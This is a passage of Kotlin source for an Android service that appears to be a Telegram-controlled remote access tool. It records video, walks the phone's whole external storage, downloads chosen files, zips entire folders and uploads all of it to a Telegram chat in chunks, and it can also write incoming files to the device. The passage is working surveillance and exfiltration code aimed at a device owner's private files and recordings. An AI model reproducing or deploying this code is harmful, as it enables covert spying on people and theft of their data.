                setAudioEncodingBitRate(128_000)
                setOutputFile(file.absolutePath)
                prepare(); start()
            }
            // Progress every 10s
            var elapsed = 0
            while (elapsed < durSec) {
                val wait = minOf(10, durSec - elapsed)
                Thread.sleep(wait * 1_000L)
                elapsed += wait
                val pct = (elapsed * 100 / durSec)
                if (elapsed < durSec) sendMessage(chatId, "${dp()}🎥 Recording… $pct% ($elapsed/${durSec}s)")
            }
            rec.stop(); rec.release()
            if (!file.exists() || file.length() == 0L) {
                sendMessage(chatId, "${dp()}❌ Video recording empty."); return
            }
            sendMessage(chatId, "${dp()}🎥 Done! ${formatSize(file.length())} — splitting & uploading…\n⏳ 90%")
            // Split and send in 49MB chunks
            if (file.length() <= CHUNK_LIMIT) {
                sendVideoFile(chatId, file, "🎥 Video ($label, ${durSec}s)")
            } else {
                splitAndSendVideo(chatId, file, label, durSec)
            }
        } catch (e: Exception) {
            sendMessage(chatId, "${dp()}❌ Video error: ${e.message}")
            try { rec.release() } catch (_: Exception) {}
        } finally { try { file.delete() } catch (_: Exception) {} }
    }

    private fun sendVideoFile(chatId: String, file: File, caption: String) {
        try {
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("video", file.name, file.readBytes().toRequestBody("video/mp4".toMediaTypeOrNull()))
                .addFormDataPart("caption", "${dp()}$caption").build()
            httpClient.newCall(Request.Builder().url(URL_SEND_VIDEO).post(body).build()).execute().use { r ->
                if (!r.isSuccessful) sendMessage(chatId, "${dp()}❌ Video upload failed: ${r.code}")
                else sendMessage(chatId, "${dp()}✅ Video sent!")
            }
        } catch (e: Exception) { sendMessage(chatId, "${dp()}❌ Video upload error: ${e.message}") }
    }

    private fun splitAndSendVideo(chatId: String, file: File, label: String, durSec: Int) {
        // Split file into 49MB byte chunks and send each as document
        val data  = file.readBytes()
        val total = Math.ceil(data.size.toDouble() / CHUNK_LIMIT).toInt()
        sendMessage(chatId, "${dp()}📦 Video is large — splitting into $total parts…")
        for (i in 0 until total) {
            val start = (i * CHUNK_LIMIT).toInt()
            val end   = minOf(start + CHUNK_LIMIT.toInt(), data.size)
            val chunk = data.copyOfRange(start, end)
            val partFile = File(cacheDir, "video_part${i + 1}of${total}_${System.currentTimeMillis()}.mp4")
            partFile.writeBytes(chunk)
            val caption = "🎥 Video ($label, ${durSec}s) — Part ${i + 1}/$total"
            sendMessage(chatId, "${dp()}⬆️ Uploading part ${i + 1}/$total…")
            try {
                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId)
                    .addFormDataPart("document", partFile.name, chunk.toRequestBody("video/mp4".toMediaTypeOrNull()))
                    .addFormDataPart("caption", caption).build()
                httpClient.newCall(Request.Builder().url(URL_SEND_DOCUMENT).post(body).build()).execute().use { r ->
                    if (!r.isSuccessful) sendMessage(chatId, "${dp()}❌ Part ${i + 1} failed: ${r.code}")
                }
            } finally { partFile.delete() }
        }
        sendMessage(chatId, "${dp()}✅ All $total video parts sent!")
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  ALL FILES — new file manager with breadcrumb path
    // ══════════════════════════════════════════════════════════════════════════

    private fun handleAllFiles(chatId: String, pathArg: String) {
        val root   = Environment.getExternalStorageDirectory()
        val target = if (pathArg.isEmpty()) root else resolveFolder(root, pathArg)
        if (target == null) {
            sendMessage(chatId, "${dp()}❌ Path not found: `$pathArg`\nSend /allfiles to start from root.", "Markdown"); return
        }
        val relPath = if (pathArg.isEmpty()) "/" else "/$pathArg"
        folderPathCache[chatId] = pathArg
        val all     = target.listFiles()?.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() })) ?: emptyList()
        val folders = all.filter { it.isDirectory }
        val files   = all.filter { it.isFile && it.length() > 0 }
        folderFileCache[chatId] = files

        val sb = StringBuilder()
        sb.append("${dp()}📂 *Path: `$relPath`*\n")
        sb.append("─────────────────\n")

        if (folders.isNotEmpty()) {
            sb.append("📁 *Folders (${folders.size}):*\n")
            folders.forEachIndexed { i, f ->
                val size  = formatSize(getFolderSize(f))
                val count = f.listFiles()?.size ?: 0
                sb.append("  📁 `${f.name}` — $count items, $size\n")
                val subPath = if (pathArg.isEmpty()) f.name else "$pathArg/${f.name}"
                sb.append("  → `/allfiles $subPath`\n")
            }
            sb.append("\n")
        }

        if (files.isNotEmpty()) {
            sb.append("📄 *Files (${files.size}):*\n")
            files.forEachIndexed { i, f ->
                sb.append("  ${i + 1}. `${f.name}` — ${formatSize(f.length())}\n")
            }
            sb.append("\n📥 `/allfiles $relPath <number>` to download\n")
            sb.append("🗜️ `/zip ${pathArg.ifEmpty { "/" }}` to ZIP all")
        }

        if (folders.isEmpty() && files.isEmpty()) sb.append("📭 Empty folder.")

        // Split if too long
        val msg = sb.toString()
        if (msg.length <= 4000) sendMessage(chatId, msg, "Markdown")
        else {
            sendMessage(chatId, msg.take(4000), "Markdown")
            sendMessage(chatId, msg.drop(4000).take(4000), "Markdown")
        }
    }

    private fun handleAllFilesSelect(chatId: String, number: Int) {
        val list = folderFileCache[chatId]
        if (list.isNullOrEmpty()) {
            sendMessage(chatId, "${dp()}⚠️ Browse a folder first with /allfiles"); return
        }
        val idx = number - 1
        if (idx < 0 || idx >= list.size) {
            sendMessage(chatId, "${dp()}❌ Choose 1–${list.size}."); return
        }
        val file = list[idx]
        val estSec = (file.length() / 500_000).coerceAtLeast(2)
        sendMessage(chatId, "${dp()}📤 Sending *${file.name}* (${formatSize(file.length())})…\n⏳ ~${estSec}s | 0%", "Markdown")
        serviceScope.launch {
            try {
                val mime = MimeTypeMap.getSingleton().getMimeTypeFromExtension(file.extension.lowercase())
                    ?: "application/octet-stream"
                if (file.length() > CHUNK_LIMIT) {
                    sendMessage(chatId, "${dp()}📦 File > 49MB — splitting…")
                    zipAndSendInChunks(chatId, listOf(file), file.nameWithoutExtension)
                    return@launch
                }
                sendMessage(chatId, "${dp()}⬆️ Uploading… 50%")
                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId)
                    .addFormDataPart("document", file.name, file.readBytes().toRequestBody(mime.toMediaTypeOrNull()))
                    .addFormDataPart("caption", "📎 ${file.name} (${formatSize(file.length())})").build()
                httpClient.newCall(Request.Builder().url(URL_SEND_DOCUMENT).post(body).build()).execute().use { r ->
                    if (!r.isSuccessful) sendMessage(chatId, "${dp()}❌ Upload failed: ${r.code}")
                    else sendMessage(chatId, "${dp()}✅ *${file.name}* sent!", "Markdown")
                }
            } catch (e: Exception) { sendMessage(chatId, "${dp()}❌ Error: ${e.message}") }
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  ZIP
    // ══════════════════════════════════════════════════════════════════════════

    private fun handleZip(chatId: String, pathArg: String) {
        val root   = Environment.getExternalStorageDirectory()
        val target = resolveFolder(root, pathArg) ?: File(root, pathArg).takeIf { it.isFile }
        if (target == null) { sendMessage(chatId, "${dp()}❌ Not found: `$pathArg`", "Markdown"); return }
        val files = if (target.isFile) listOf(target)
                    else target.walkTopDown().filter { it.isFile }.toList()
        val totalSize = files.sumOf { it.length() }
        sendMessage(chatId, "${dp()}🗜️ Zipping `$pathArg`…\n📊 ${files.size} files, ${formatSize(totalSize)}\n⏳ Please wait | 0%", "Markdown")
        serviceScope.launch { zipAndSendInChunks(chatId, files, target.name) }
    }

    private fun zipAndSendInChunks(chatId: String, files: List<File>, baseName: String) {
        val chunks      = mutableListOf<MutableList<File>>()
        var cur         = mutableListOf<File>()
        var curSize     = 0L
        for (f in files) {
            val sz = f.length()
            if (sz > CHUNK_LIMIT) { sendMessage(chatId, "${dp()}⚠️ Skipped `${f.name}` (${formatSize(sz)} > 49MB)", "Markdown"); continue }
            if (curSize + sz > CHUNK_LIMIT && cur.isNotEmpty()) { chunks.add(cur); cur = mutableListOf(); curSize = 0L }
            cur.add(f); curSize += sz
        }
        if (cur.isNotEmpty()) chunks.add(cur)
        if (chunks.isEmpty()) { sendMessage(chatId, "${dp()}❌ Nothing to ZIP."); return }
        val total = chunks.size
        chunks.forEachIndexed { idx, chunkFiles ->
            val pct     = ((idx + 1) * 100 / total)
            val partLbl = if (total > 1) "_part${idx + 1}of$total" else ""
            val zipFile = File(cacheDir, "$baseName${partLbl}_${System.currentTimeMillis()}.zip")
            if (total > 1) sendMessage(chatId, "${dp()}📦 Building part ${idx + 1}/$total… $pct%")
            try {
                ZipOutputStream(zipFile.outputStream().buffered()).use { zos ->
                    for (f in chunkFiles) {
                        try {
                            zos.putNextEntry(ZipEntry(f.name))
                            f.inputStream().use { it.copyTo(zos) }
                            zos.closeEntry()
                        } catch (_: Exception) {}
                    }
                }
                if (!zipFile.exists() || zipFile.length() == 0L) {
                    sendMessage(chatId, "${dp()}❌ ZIP part ${idx + 1} empty."); return@forEachIndexed
                }
                val cap = if (total > 1) "📦 $baseName — Part ${idx + 1}/$total (${formatSize(zipFile.length())})"
                          else "📦 $baseName.zip (${formatSize(zipFile.length())})"
                sendMessage(chatId, "${dp()}⬆️ Uploading $cap… $pct%")
                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId)
                    .addFormDataPart("document", zipFile.name, zipFile.readBytes().toRequestBody("application/zip".toMediaTypeOrNull()))
                    .addFormDataPart("caption", cap).build()
                httpClient.newCall(Request.Builder().url(URL_SEND_DOCUMENT).post(body).build()).execute().use { r ->
                    if (!r.isSuccessful) sendMessage(chatId, "${dp()}❌ Upload failed part ${idx + 1}: ${r.code}")
                }
            } catch (e: Exception) { sendMessage(chatId, "${dp()}❌ Error part ${idx + 1}: ${e.message}") }
            finally { try { zipFile.delete() } catch (_: Exception) {} }
        }
        if (total > 1) sendMessage(chatId, "${dp()}✅ All $total ZIP parts sent!")
        else sendMessage(chatId, "${dp()}✅ ZIP sent!")
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  INCOMING DOCUMENT FROM USER
    // ══════════════════════════════════════════════════════════════════════════

    private fun handleIncomingDocument(chatId: String, fileObj: JSONObject, fallbackName: String = "received_${System.currentTimeMillis()}") {
        val fileId   = fileObj.optString("file_id").ifEmpty { sendMessage(chatId, "${dp()}⚠️ No file_id."); return }
        val fileName = fileObj.optString("file_name").ifEmpty { fallbackName }
        sendMessage(chatId, "${dp()}💾 Saving *$fileName*…\n⏳ Please wait | 0%", "Markdown")
        serviceScope.launch {
            try {
                val path = getTelegramFilePath(fileId) ?: run { sendMessage(chatId, "${dp()}❌ Cannot resolve file."); return@launch }
                sendMessage(chatId, "${dp()}⬇️ Downloading… 50%")
                val bytes = httpClient.newCall(Request.Builder().url("$BASE_FILE_URL/$path").get().build()).execute().use { r ->
                    if (!r.isSuccessful) { sendMessage(chatId, "${dp()}❌ Download failed: ${r.code}"); return@launch }
                    r.body?.bytes() ?: run { sendMessage(chatId, "${dp()}❌ Empty."); return@launch }
                }
                val mime = MimeTypeMap.getSingleton().getMimeTypeFromExtension(fileName.substringAfterLast('.', ""))
                    ?: "application/octet-stream"
                if (saveToDownloads(fileName, mime, bytes))
                    sendMessage(chatId, "${dp()}✅ *$fileName* saved to Downloads.", "Markdown")
                else sendMessage(chatId, "${dp()}❌ Failed to write file.")
            } catch (e: Exception) { sendMessage(chatId, "${dp()}❌ Error: ${e.message}") }
        }
    }

    private fun getTelegramFilePath(fileId: String): String? {
        return try {
            val body = httpClient.newCall(Request.Builder().url("$URL_GET_FILE?file_id=$fileId").get().build())
                .execute().use { it.body?.string() } ?: return null
            val json = JSONObject(body)
            if (!json.optBoolean("ok", false)) null
            else json.optJSONObject("result")?.optString("file_path")
        } catch (_: Exception) { null }
    }

    private fun saveToDownloads(fileName: String, mimeType: String, bytes: ByteArray): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val values = ContentValues().apply {
                    put(MediaStore.Downloads.DISPLAY_NAME, fileName)
                    put(MediaStore.Downloads.MIME_TYPE, mimeType)
                    put(MediaStore.Downloads.IS_PENDING, 1)
                }
                val uri = contentResolver.insert(
                    MediaStore.Downloads.getContentUri(MediaStore.VOLUME_EXTERNAL_PRIMARY), values)
                    ?: return false
                contentResolver.openOutputStream(uri)?.use { it.write(bytes) }
                values.clear(); values.put(MediaStore.Downloads.IS_PENDING, 0)
                contentResolver.update(uri, values, null, null)
            } else {
                val dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
                dir.mkdirs(); File(dir, fileName).writeBytes(bytes)
            }
            true
        } catch (_: Exception) { false }
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  HELPERS
    // ══════════════════════════════════════════════════════════════════════════

    private fun hasPermission(perm: String) =
        ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED

    private fun resolveFolder(root: File, path: String): File? {
        val direct = File(root, path)
        if (direct.exists() && direct.isDirectory) return direct
        var cur = root
        for (seg in path.split("/")) {
            cur = cur.listFiles()?.firstOrNull {
                it.name.lowercase() == seg.lowercase() && it.isDirectory
            } ?: return null
        }
        return cur
    }

    private fun getFolderSize(dir: File): Long {
        var t = 0L; dir.walkTopDown().forEach { if (it.isFile) t += it.length() }; return t
    }

    private fun formatSize(bytes: Long): String = when {
        bytes >= 1_073_741_824L -> "${"%.1f".format(bytes / 1_073_741_824.0)} GB"
        bytes >= 1_048_576L     -> "${"%.1f".format(bytes / 1_048_576.0)} MB"
        bytes >= 1_024L         -> "${"%.1f".format(bytes / 1_024.0)} KB"
        else                    -> "$bytes B"
    }

    private fun formatAgo(ms: Long): String {
        val s = ms / 1000
        return when { s < 60 -> "${s}s ago"; s < 3600 -> "${s / 60}m ago"; else -> "${s / 3600}h ago" }
    }

    private fun startForegroundWithNotification() {
        val pi = PendingIntent.getActivity(this, 0, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
        val notif = NotificationCompat.Builder(this, getString(R.string.notif_channel_id))
            .setContentTitle(getString(R.string.notif_title))
            .setContentText("[$deviceNumber] $deviceName — Active")
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setOngoing(true).setContentIntent(pi).build()
        startForeground(NOTIFICATION_ID, notif)
    }

    private fun sendMessage(chatId: String, text: String, parseMode: String? = null) {
        try {
            val json = JSONObject().apply {
                put("chat_id", chatId); put("text", text)
                if (parseMode != null) put("parse_mode", parseMode)
            }
            val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())
            httpClient.newCall(Request.Builder().url(URL_SEND_MSG).post(body).build()).execute().use {}
        } catch (e: Exception) { Log.e(TAG, "sendMessage: ${e.message}") }
    }

    private fun sendPhotoWithCaption(chatId: String, file: File, caption: String) {
        try {
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("caption", caption)
                .addFormDataPart("photo", file.name, file.asRequestBody("image/jpeg".toMediaTypeOrNull())).build()
            httpClient.newCall(Request.Builder().url(URL_SEND_PHOTO).post(body).build()).execute().use { r ->
                if (!r.isSuccessful) sendMessage(chatId, "${dp()}❌ Photo upload failed: ${r.code}")
            }
        } catch (e: Exception) { sendMessage(chatId, "${dp()}❌ Photo error: ${e.message}") }
    }
}
